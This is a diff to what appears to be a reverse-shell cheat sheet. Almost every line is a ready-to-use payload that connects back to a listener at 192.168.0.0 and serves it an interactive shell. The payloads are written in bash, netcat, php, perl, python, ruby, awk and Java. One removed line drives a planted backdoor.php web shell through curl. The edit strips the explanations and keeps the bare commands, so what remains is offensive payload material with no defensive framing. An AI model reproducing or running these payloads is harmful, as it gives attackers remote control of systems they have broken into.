@@ -14,38 +14,30 @@ php -r '$s=fsockopen("192.168.0.0",8888);`/bin/sh -i <&3 >&3 2>&3`;'
 ncat --udp 192.168.0.0 8888 -e /bin/bash
 nc -nv 192.168.0.0 8888 -e /bin/bash
 nc -nv 192.168.0.0 8888 -e /bin/bash
-curl http://192.168.50.11/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.0.0 8888 -e /bin/bash”
 C:\Windows\Temp\nc.exe -e cmd.exe 192.168.0.0 8888
 bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
 bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
 /bin/sh | nc 192.168.0.0 8888
 /bin/nc.traditional 192.168.0.0 8888 -e /bin/bash 
 /bin/nc.traditional 192.168.0.0 8888 -c /bin/bash
-Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
-  bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
+bash -i >& /dev/tcp/192.168.0.0/8888 0>&1
 Shorter, feature-free version of the perl-reverse-shell:
-  perl -e 'use Socket;$i="192.168.0.0";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-Python 2.7:
-  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.0",888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
-  php -r '$sock=fsockopen("192.168.0.0",888);exec("/bin/sh -i <&3 >&3 2>&3");'
-Ruby
-  ruby -rsocket -e'f=TCPSocket.open("192.168.0.0",8888).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-Netcat, some of which don’t support the -e option.
-  nc -e /bin/sh 192.168.0.0 8888
-If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
-  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.0 8888 >/tmp/f
-Java
+perl -e 'use Socket;$i="192.168.0.0";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.0",888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+php -r '$sock=fsockopen("192.168.0.0",888);exec("/bin/sh -i <&3 >&3 2>&3");'
+ruby -rsocket -e'f=TCPSocket.open("192.168.0.0",8888).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+nc -e /bin/sh 192.168.0.0 8888
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.0 8888 >/tmp/f
+awk 'BEGIN {s = "/inet/tcp/0/192.168.0.0/8888"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+java
 r = Runtime.getRuntime() 
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.0/8888;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) 
 p.waitFor()
-Awk
-  awk 'BEGIN {s = "/inet/tcp/0/192.168.0.0/8888"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 Java
 Runtime r = Runtime.getRuntime();
 Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/192.168.0.0/8888;cat <&5 | while read line; do $line 2>&5 >&5; done'");
 p.waitFor();
-
 Java Alternative 1
 String host="127.0.0.1";
 int port=4444;
